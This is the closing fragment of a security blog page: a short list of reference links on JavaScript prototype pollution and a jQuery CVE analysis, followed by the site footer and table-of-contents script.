<p><a href="https://www.smi1e.top/javascript-原型链污染/" target="_blank" rel="noopener">JavaScript 原型链污染</a></p>
<p><a href="https://anemone.top/JS-原型链污染/" target="_blank" rel="noopener">JavaScript原型链污染学习笔记</a></p>
<p><a href="https://www.anquanke.com/post/id/176884" target="_blank" rel="noopener">JavaScript 原型链污染</a></p>
<p><a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a></p>

</div>

<br>
<div><center>
  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
</center></div>


  <div class="book-comments">
    




  </div>


<script src="/js/book-post.js"></script>
        </div>
      </div>

      <div class="column col-2 hide-lg">
        <div class="book-toc">
  <div class="book-tocbot">
  </div>
  <div class="book-tocbot-menu">
    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
    <a onclick="go_top()">Back to top</a>
    <a onclick="go_bottom()">Go to bottom</a>
  </div>
</div>

<script>
tocbot.init({
  tocSelector: '.book-tocbot',
  contentSelector: '.book-post',
  headingSelector: 'h1, h2, h3, h4, h5',
  collapseDepth: 2,
  orderedList: false,
  scrollSmooth: false,
});

function expand_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 6,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "collapse_toc()");
  b.innerHTML = "Collapse all"
}

function collapse_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 2,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "expand_toc()");
  b.innerHTML = "Expand all"
}

function go_top() {
  window.scrollTo(0, 0);
}

function go_bottom() {
  window.scrollTo(0, document.body.scrollHeight);
}

</script>
      </div>
    </div>
  </div>
</div>

</body>
</html>
